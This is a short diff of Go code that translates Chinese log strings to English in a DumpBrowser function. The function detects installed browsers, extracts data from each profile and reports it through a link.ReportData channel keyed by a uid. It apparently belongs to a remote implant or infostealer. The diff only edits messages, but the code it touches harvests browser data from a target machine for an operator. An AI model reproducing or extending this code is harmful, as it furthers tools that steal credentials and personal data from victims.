@@ -13,11 +13,11 @@ import (
 func DumpBrowser(uid string) {
 	browsers, err := browser.PickBrowsers(browser.PickOptions{})
 	if err != nil {
-		link.ReportData(31, []byte(fmt.Sprintf("[!] 浏览器检测失败: %v\n", err)))
+		link.ReportData(31, []byte(fmt.Sprintf("[!] Browser detection failed: %v\n", err)))
 		return
 	}
 	if len(browsers) == 0 {
-		link.ReportData(0, []byte("[!] 未检测到浏览器\n"))
+		link.ReportData(0, []byte("[!] No browsers detected\n"))
 		return
 	}
 
@@ -27,11 +27,11 @@ func DumpBrowser(uid string) {
 	}
 
 	for _, b := range browsers {
-		link.ReportData(0, []byte(fmt.Sprintf("[*] 正在提取 %s (%s) ...\n", b.BrowserName(), b.ProfileName())))
+		link.ReportData(0, []byte(fmt.Sprintf("[*] Extracting %s (%s) ...\n", b.BrowserName(), b.ProfileName())))
 
 		data, err := b.Extract(categories)
 		if err != nil {
-			link.ReportData(31, []byte(fmt.Sprintf("[!] %s: 提取失败: %v\n", b.BrowserName(), err)))
+			link.ReportData(31, []byte(fmt.Sprintf("[!] %s: extraction failed: %v\n", b.BrowserName(), err)))
 			continue
 		}
 		if data == nil {
